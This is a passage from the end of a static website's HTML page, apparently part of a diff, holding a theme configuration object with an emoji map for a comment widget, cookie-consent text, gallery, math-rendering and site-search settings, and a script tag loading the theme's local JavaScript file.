f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"visitor":true}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
